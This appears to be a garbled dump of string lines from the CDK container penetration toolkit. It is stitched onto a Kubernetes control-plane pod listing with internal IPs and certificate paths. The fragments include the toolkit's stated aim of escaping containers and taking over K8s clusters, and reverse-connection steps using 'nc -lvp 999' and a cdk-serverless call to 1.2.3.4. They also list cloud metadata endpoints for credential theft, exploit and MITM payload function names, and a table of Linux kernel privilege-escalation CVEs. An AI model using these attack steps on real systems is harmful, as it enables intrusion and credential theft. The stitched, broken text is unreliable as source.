"":""ce808e7969c6fd3d9ec44e79813ec9c1"",""kubernetes.io/config.mirror"":""ce808e7969c6fd3d9ec44e79813ec9c1"",""kubernetes.io/config.seen"":""2020-04-08T12:08:53.764429839"
"08:00"",""kubernetes.io/config.source"":""file""}},""spec"":{""volumes"":[{""name"":""k8s-audit"",""hostPath"":{""path"":""/var/log/kubernetes"",""type"":""DirectoryOrCreate""}},{""name"":""audit-policy"",""hostPath"":{""path"":""/etc/kubernetes/audit-policy.yml"",""type"":""FileOrCreate""}},{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.152"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key""],""env"":[{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4"",""value"":""/var/log/kubernetes/kubernetes.audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_tags"",""value"":""audit=apiserver""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_product"",""value"":""k8s-audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_jsonfile"",""value"":""true""}],""resources"":{""requests"":{""cpu"":""250m""}},""volumeMounts"":[{""name"":""k8s-audit"",""mountPath"":""/var/log/kubernetes""},{""name"":""audit-policy"",""readOnly"":true,""mountPath"":""/etc/kubernetes/audit-policy.yml""},{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":6443,""host"":""192.168.0.152"",""scheme"":""HTTPS""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.152"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:09:04Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:09:04Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:08:44Z""}],""hostIP"":""192.168.0.152"",""podIP"":""192.168.0.152"",""podIPs"":[{""ip"":""192.168.0.152""}],""startTime"":""2020-04-08T04:08:44Z"",""containerStatuses"":[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-04-08T04:09:03Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://4ab12460c914840ef86e6096faa438339096d5c0e6da88c66dd2b9ac47f76c0d"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-controller-manager-cn-beijing.192.168.0.150"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-controller-manager-cn-beijing.192.168.0.150"",""uid"":""901c27fa-7b97-4938-920c-91d8f588aae7"",""resourceVersion"":""35736324"",""creationTimestamp"":""2020-04-08T04:05:04Z"",""labels"":{""component"":""kube-controller-manager"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""113cd782cb781eb2fdff73f2820a21d7"",""kubernetes.io/config.mirror"":""113cd782cb781eb2fdff73f2820a21d7"",""kubernetes.io/config.seen"":""2020-04-08T12:05:04.169564569"
"08:00"",""kubernetes.io/config.source"":""file""}},""spec"":{""volumes"":[{""name"":""kubeconfig"",""hostPath"":{""path"":""/etc/kubernetes/scheduler.conf"",""type"":""FileOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-scheduler"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"",""command"":[""kube-scheduler"",""--authentication-kubeconfig=/etc/kubernetes/scheduler.conf"",""--authorization-kubeconfig=/etc/kubernetes/scheduler.conf"",""--bind-address=127.0.0.1"",""--kubeconfig=/etc/kubernetes/scheduler.conf"",""--leader-elect=true"",""--profiling=false""],""resources"":{""requests"":{""cpu"":""100m""}},""volumeMounts"":[{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/scheduler.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10251,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.150"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:25Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:27Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:27Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-09-10T07:23:25Z""}],""hostIP"":""192.168.0.150"",""podIP"":""192.168.0.150"",""podIPs"":[{""ip"":""192.168.0.150""}],""startTime"":""2020-09-10T07:23:25Z"",""containerStatuses"":[{""name"":""kube-scheduler"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:26Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:05:17Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://cd2fbdf2a0b47875d8714ce3859add7ce1c2869baedf2d15012c1b57b2ab4bdc""}},""ready"":true,""restartCount"":2,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler@sha256:ca6c8fdb476ef0541b38da740a11f7e7ccd01842bd0a3421ffb62b4aa1eadcb4"",""containerID"":""docker://6cf0fd06830849a8f4db52213fba2fd59dc3e3aac74b04dbea43f93106888bfb"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-scheduler-cn-beijing.192.168.0.151"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-scheduler-cn-beijing.192.168.0.151"",""uid"":""2db5e97f-8bc3-480b-abf9-2483180990e2"",""resourceVersion"":""645"",""creationTimestamp"":""2020-04-08T04:08:23Z"",""labels"":{""component"":""kube-scheduler"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""fb6b595bf06e476799e506ef26ec872f"",""kubernetes.io/config.mirror"":""fb6b595bf06e476799e506ef26ec872f"",""kubernetes.io/config.seen"":""2020-04-08T12:06:53.834365706"
"08:00"",""kubernetes.io/config.source"":""file""}},""spec"":{""volumes"":[{""name"":""kubeconfig"",""hostPath"":{""path"":""/etc/kubernetes/scheduler.conf"",""type"":""FileOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}],""containers"":[{""name"":""kube-scheduler"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"",""command"":[""kube-scheduler"",""--authentication-kubeconfig=/etc/kubernetes/scheduler.conf"",""--authorization-kubeconfig=/etc/kubernetes/scheduler.conf"",""--bind-address=127.0.0.1"",""--kubeconfig=/etc/kubernetes/scheduler.conf"",""--leader-elect=true"",""--profiling=false""],""resources"":{""requests"":{""cpu"":""100m""}},""volumeMounts"":[{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/scheduler.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}],""livenessProbe"":{""httpGet"":{""path"":""/healthz"",""port"":10251,""host"":""127.0.0.1"",""scheme"":""HTTP""},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists"",""effect"":""NoExecute""}],""priorityClassName"":""system-cluster-critical"",""priority"":2000000000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:57Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:57Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:57Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:06:57Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:06:57Z"",""containerStatuses"":[{""name"":""kube-scheduler"",""state"":{""running"":{""startedAt"":""2020-04-08T04:06:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler@sha256:ca6c8fdb476ef0541b38da740a11f7e7ccd01842bd0a3421ffb62b4aa1eadcb4"",""containerID"":""docker://75c278c7ac29095b0f6114bf475ddb37152f36eb037244a9c21d82b606dc556a"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-scheduler-cn-beijing.192.168.0.152"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-scheduler-cn-beijing.192.168.0.152"",""uid"":""e620619d-c1d3-4343-9acf-94acf759307f"",""resourceVersion"":""915"",""creationTimestamp"":""2020-04-08T04:09:59Z"",""labels"":{""component"":""kube-scheduler"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""fb6b595bf06e476799e506ef26ec872f"",""kubernetes.io/config.mirror"":""fb6b595bf06e476799e506ef26ec872f"",""kubernetes.io/config.seen"":""2020-04-08T12:08:40.982082844"
"1"", rhost, rport)"
"1. First, host CDK binary on your host with public IP."
"1. public server(e.g. 1.2.3.4) start listen tcp port 999 using ""nc -lvp 999"""
"10',  "
"10,ubuntu=14.04.5"
"100, // RFC 7231, 6.2.1"
"101, // RFC 7231, 6.2.2"
"102, // RFC 2518, 10.1"
"103, // RFC 8297"
"11,fedora,manjaro"
"12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}"
"17.04,fedora=22"
"17.04,fedora=23"
"2. Exploit: for container escaping, persistance and lateral movement"
"2. inside serverless function service execute ""./cdk-serverless /code 1.2.3.4 999"""
"2.6.33.9-rt31},RHEL=7{kernel:3.10.0-"
"20, debian=10"
"20, debian=9"
"200, // RFC 7231, 6.3.1"
"201, // RFC 7231, 6.3.2"
"202, // RFC 7231, 6.3.3"
"203, // RFC 7231, 6.3.4"
"204, // RFC 7231, 6.3.5"
"205, // RFC 7231, 6.3.6"
"206, // RFC 7233, 4.1"
"207, // RFC 4918, 11.1"
"208, // RFC 5842, 7.1"
"21,debian=7"
"21.04),debian=11"
"226, // RFC 3229, 10.4.1"
"25,centos=7.3.1611"
"27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04"
"29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}"
"3. Tool: network-tools and APIs for TCP/HTTP requests, tunnels and K8s cluster management."
"30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working"
"31m"""
"32m"""
"36m"""
"37m"""
"4.2.0-0.21.el7},ubuntu=16.04"
"5).el6},RHEL=6{libuser:0.60-5.el7},fedora=13"
"6,RHEL=4"
"7,ubuntu=14.04"
"8,RHEL=5"
"8,RHEL=5{kernel:2.6.(18"
"8,ubuntu=14"
"8.0,ubuntu="
"9.0,ubuntu=14.04.2"
"9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21"
"<a href=""https://github.com/cdk-team/cdk/graphs/contributors"">"
"<cron-expr>) <image> <args>"""
"<service-account-token-path>) <image> <cmd>"""
"<service-account-token-path>) <image> <ip> <port>"""
"<service-account-token-path>) <target-service-account> <ip> <port>"""
"<service-account-token-path>)"""
"API:           ""http://100.100.100.200/latest/meta-data/"","
"API:           ""http://100.80.80.80/meta-data/latest/uhost/"","
"API:           ""http://169.254.169.254/latest/meta-data/"","
"API:           ""http://169.254.169.254/metadata/instance"","
"API:           ""http://169.254.169.254/openstack/latest/meta_data.json"","
"API:           ""http://metadata.google.internal/computeMetadata/v1/instance/disks/"
"API:           ""http://metadata.tencentyun.com/latest/meta-data/"","
"ARCH="""""
"ARGS=$(getopt --options $SHORTOPTS  --longoptions $LONGOPTS -- ""$@"")"
"Anonymous: AnonymousFlag,"
"Anonymous: anonymous,"
"Anonymous: false,"
"Anonymous: true,"
"Api:       ""/"","
"Api:       ""/api/v1/namespaces"","
"Api:       ""/api/v1/namespaces/kube-system/pods"","
"Api:       ""/apis"","
"Api:       ""/v3/kv/range"","
"Api:       ""/version"","
"Api:       K8sDeploymentsAPI,"
"Api:       K8sServicesApi,"
"Api:       configmapApi,"
"Api:       cronJobAPI,"
"Api:       defaultPodApi,"
"Api:       fmt.Sprintf(""/api/v1/namespaces/%s/pods"", namespace),"
"Api:       fmt.Sprintf(""/api/v1/namespaces/%s/pods/%s"", namespace, podName),"
"Api:       getDaemonsetApi(apiVersion),"
"Api:       k8sCreateSystemPodAPI,"
"Api:       pspApi,"
"Api:       secretApi,"
"Api:      ""/version"","
"Api:    ""/api/v1/namespaces/kube-system/pods"","
"Api:    ""/logs/"","
"Api:    ""/pods"","
"Api:    uri,"
"B].{0,30}['"
"BannerContainerTpl,"
"Bugs are tracked as [GitHub Issues](https://github.com/cdk-team/CDK/issues). Create an issue with the current CDK version, error msg and the environment. Describe the exact steps which reproduce the problem."
"Bundle:   dockerAbsPath,       // use container abspath so runc can find config.json"
"CDK is an open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency. It comes with useful net-tools and many powerful PoCs/EXPs and helps you to escape container and take over K8s cluster easily."
"CDKRuntimeError{nil, text}"
"CGO_CFLAGS=""-Wno-deprecated-declarations"""
"CONFIG="""""
"CVELIST_FILE="""""
"CapAmb):"")"
"CapDacReadSearchExploit(target, ref, chroot, cmd)"
"CloudProvider: ""Alibaba Cloud"","
"CloudProvider: ""Amazon Web Services (AWS)"","
"CloudProvider: ""Azure"","
"CloudProvider: ""Google Cloud"","
"CloudProvider: ""OpenStack"","
"CloudProvider: ""Tencent Cloud"","
"CloudProvider: ""ucloud"","
"Color:     colorful,"
"Comments: Modified version at 'ext-url' uses bash exec technique, rather than compiling with gcc."
"Comments: RHEL 5 is also vulnerable, but installed version of glibc (2.5) lacks functions needed by roothelper.c"
"Comments: Uses ""Stack Clash"" technique"
"Comments: Uses ""Stack Clash"" technique, works against most SUID-root PIEs"
"Comments: Uses ""Stack Clash"" technique, works against most SUID-root binaries"
"ControllerLst string // split by "","" but should not be split"
"Convert) Read(p []byte) (n int, err error) {"
"Convert) Write(p []byte) (n int, err error) {"
"Convert) translate(p []byte, encoding string) []byte {"
"CustomMsg: ""cannot get current executable path"","
"CustomMsg: ""container filesystem path on host cannot be found"","
"CustomMsg: ""gid_map setgroups failed"","
"CustomMsg: ""set gid_map failed"","
"CustomMsg: ""set uid_map failed"","
"CustomMsg: errMsg,"
"DISTRO="""""
"DebugPrefix = ""[DEBUG] """
"Desc: """","
"Desc: desc,"
"DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {"
"DocURL:        ""https://cloud.google.com/compute/docs/storing-retrieving-metadata"","
"DocURL:        ""https://cloud.tencent.com/document/product/213/4934"","
"DocURL:        ""https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"","
"DocURL:        ""https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service"","
"DocURL:        ""https://docs.openstack.org/nova/rocky/user/metadata-service.html"","
"DocURL:        ""https://docs.ucloud.cn/uhost/guide/metadata/metadata-server"","
"DocURL:        ""https://help.aliyun.com/knowledge_detail/49122.html"","
"DockerRemoteAPIExploit(url, cmd)"
"EXP=$(echo ""$EXP_TEMP"" "
"EXPLOITS[@]} kernel space exploits"""
"EXPLOITS_USERSPACE[@]} user space exploits"""
"EXPLOIT_DB=$(echo ""$EXP"" "
"Endpoint:  endpoint,"
"Endpoint: endpoint,"
"Err:       err,"
"Err:       nil,"
"ErrorPrefix = ""[ERROR] """
"Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/"
"First off, thanks for taking the time to contribute!"
"From: 1,"
"From: 2,"
"From: 3,"
"From: from,"
"GetKeys(resp, false)"
"GidMappingsEnableSetgroups: false,"
"ID:       util.RandString(10), // needs to be different in each exploit"
"If you have a RCE exploit, but the target container has no "
"If you have an exploit that can upload a file, then you can upload CDK binary directly."
"If you want to know how we released a new version, how thin is produced, why we provide upx versions, what the differences between different versions about all, normal, thin, upx are, and how to choose specific CDK exploits and tools to compile an own release for yourself, please check the [Release Document](https://github.com/cdk-team/CDK/wiki/Release)."
"InfoPrefix  = ""[INFO_]  """
"K8sMitmPayloadDeploy = strings.Replace(K8sMitmPayloadDeploy, ""${image}"", image, -1)"
"K8sMitmPayloadDeploy = strings.Replace(K8sMitmPayloadDeploy, ""${port}"", port, -1)"
"K8sMitmPayloadSvc = strings.Replace(K8sMitmPayloadSvc, ""${ip}"", ip, -1)"
"K8sMitmPayloadSvc = strings.Replace(K8sMitmPayloadSvc, ""${port}"", port, -1)"
"KCONFIG="""""
"KERNEL="""""
"K].{0,30}['"
"LONGOPTS=""help,version,full,fetch-binaries,fetch-sources,uname:,kernel:,show-dos,pkglist-file:,short,kernelspace-only,userspace-only,skip-more-checks,skip-pkg-versions,cvelist-file:,checksec"""
"Level:     DefaultLevel,"
"LevelLogger) Debug(format string, v ...interface{}) {"
"LevelLogger) Error(format string, v ...interface{}) {"
"LevelLogger) Info(format string, v ...interface{}) {"
"LevelLogger) Warn(format string, v ...interface{}) {"
"Licensed under the Apache License, Version 2.0 (the ""License"")"
"Like ""netstat -antup"" command"
"MaxParallel: 50,"
"Method:    ""GET"","
"Method:    ""POST"","
"Method:    ""get"","
"Method:    ""post"","
"Method:   ""GET"","
"Method: ""GET"","
"Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage (ppc)"
"Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage"
"Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage2"
"Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage3"
"Name: ${txtgrn}[CVE-2010-3848,CVE-2010-3850,CVE-2010-4073]${txtrst} half_nelson"
"Name: ${txtgrn}[CVE-2012-0056,CVE-2010-3849,CVE-2010-3850]${txtrst} full-nelson"
"Name: ${txtgrn}[CVE-2016-6663,CVE-2016-6664"
"Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000370]${txtrst} linux_ldso_hwcap"
"Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000371]${txtrst} linux_ldso_dynamic"
"Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000379]${txtrst} linux_ldso_hwcap_64"
"Name: ${txtgrn}[CVE-2017-1000370,CVE-2017-1000371]${txtrst} linux_offset2lib"
"OS="""""
"PKG_LIST="""""
"PostData:  """","
"PostData:  cronJobConfig,"
"PostData:  data,"
"PostData:  etcdctl.GenerateQuery(""/""),"
"PostData:  podData,"
"PrintFunc func(format string, v ...interface{})"
"PrintFunc: logger.Printf,"
"ProcfsExploit(procDir, shellPayload)"
"RANK=$(echo ""$EXP_TEMP"" "
"R].{0,30}['"
"Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern"
"Reqs: pkg=apport,ver>=2.13,ver<=2.17,cmd:grep -qi apport /proc/sys/kernel/core_pattern"
"Reqs: pkg=blueman,ver<2.0.3"
"Reqs: pkg=chkrootkit,ver<0.50"
"Reqs: pkg=exim,ver<4.86.2"
"Reqs: pkg=fuse,ver<2.9.3"
"Reqs: pkg=ktsuss,ver<=1.4"
"Reqs: pkg=libpam-modules,ver<=1.1.1"
"Reqs: pkg=libuser,ver<=0.60"
"Reqs: pkg=linux-kernel,ver<=2.6.11"
"Reqs: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y"
"Reqs: pkg=linux-kernel,ver=2.4.29"
"Reqs: pkg=linux-kernel,ver=3.8,CONFIG_USER_NS=y"
"Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.2"
"Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30"
"Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31"
"Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.33"
"Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36"
"Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19"
"Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86"
"Reqs: pkg=linux-kernel,ver>=2.6.11,ver<=2.6.22"
"Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17"
"Reqs: pkg=linux-kernel,ver>=2.6.17,ver<=2.6.24"
"Reqs: pkg=linux-kernel,ver>=2.6.18,ver<3.7.6"
"Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.34"
"Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.36"
"Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=4.9.11,CONFIG_IP_DCCP=[my]"
"Reqs: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6"
"Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3"
"Reqs: pkg=linux-kernel,ver>=2.6.23,ver<=2.6.24"
"Reqs: pkg=linux-kernel,ver>=2.6.25,ver<=2.6.29"
"Reqs: pkg=linux-kernel,ver>=2.6.26,ver<=2.6.34"
"Reqs: pkg=linux-kernel,ver>=2.6.30,ver<2.6.37"
"Reqs: pkg=linux-kernel,ver>=2.6.31,ver<=3.14.3"
"Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9"
"Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64"
"Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36"
"Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36,x86"
"Reqs: pkg=linux-kernel,ver>=2.6.5,ver<=2.6.11"
"Reqs: pkg=linux-kernel,ver>=2.6.8,ver<=2.6.16"
"Reqs: pkg=linux-kernel,ver>=3,ver<5.0.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,CONFIG_XFRM=y"
"Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=3.1.0"
"Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3"
"Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.4.8"
"Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.17.5,x86_64"
"Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.8.9"
"Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.13"
"Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.14"
"Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.16.1"
"Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.8"
"Reqs: pkg=linux-kernel,ver>=3.10,ver<4.4.1"
"Reqs: pkg=linux-kernel,ver>=3.11,ver<4.8.14,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1"
"Reqs: pkg=linux-kernel,ver>=3.13,ver<4.1.6,x86_64"
"Reqs: pkg=linux-kernel,ver>=3.13.0,ver<=3.19.0"
"Reqs: pkg=linux-kernel,ver>=3.2,ver<=3.15.6"
"Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.10.6,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1"
"Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.13,x86_64"
"Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y"
"Reqs: pkg=linux-kernel,ver>=4,ver<5.1.17,sysctl:kernel.yama.ptrace_scope==0,x86_64"
"Reqs: pkg=linux-kernel,ver>=4.15,ver<=4.19.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,cmd:[ -u /usr/bin/newuidmap ],cmd:[ -u /usr/bin/newgidmap ]"
"Reqs: pkg=linux-kernel,ver>=4.4,ver<4.5.5,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1"
"Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.13,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1"
